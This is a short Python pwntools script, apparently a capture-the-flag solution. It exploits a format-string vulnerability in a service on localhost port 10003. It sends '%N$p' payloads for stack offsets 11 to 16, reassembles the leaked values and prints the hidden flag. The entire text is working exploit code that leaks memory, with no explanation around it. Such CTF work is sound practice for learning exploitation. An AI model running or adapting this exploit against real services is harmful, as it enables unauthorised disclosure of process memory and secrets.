from pwn import *

flag = b""

for i in range(11,17):
    context.log_level = "warn"
    p = remote('localhost', 10003)
    p.sendlineafter(b'print ', f'%{i}$p'.encode())
    res = p.recvline().strip()
    flag += p64(eval(res))
    p.close()

print(flag.strip(b'\x00').split(b'\x00')[-1])
